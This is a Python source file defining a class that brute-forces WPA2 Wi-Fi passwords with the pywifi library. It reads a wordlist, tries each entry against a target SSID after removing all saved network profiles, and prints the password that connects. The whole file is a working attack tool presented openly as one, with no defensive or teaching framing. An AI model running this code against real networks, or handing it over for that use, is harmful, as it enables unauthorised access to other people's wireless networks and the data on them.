import pywifi
import time
from pywifi import const


class BruteForce:
    """
    Class to perform brute force attacks on Wi-Fi networks.
    """

    def try_connect(self, ssid, password):
        """
        Attempt to connect to a Wi-Fi network with a given password.

        Args:
            ssid (str): The SSID of the network.
            password (str): The password to try.

        Returns:
            bool: True if connection successful, False otherwise.
        """
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        profile.key = password  # Define a senha a ser testada

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)

        time.sleep(10)

        if iface.status() == const.IFACE_CONNECTED:
            print(f"Correct password found: {password}")
            return True
        else:
            print(f"Incorrect password: {password}")
            return False

    def brute_force_attack(self, ssid, wordlist_file):
        """
        Perform a brute force attack on a Wi-Fi network using a wordlist.

        Args:
            ssid (str): The SSID of the target network.
            wordlist_file (str): Path to the wordlist file containing passwords.
        """
        with open(wordlist_file, "r") as f:
            for line in f:
                password = line.strip()  # Remove spaces and newline characters
                if self.try_connect(ssid, password):
                    break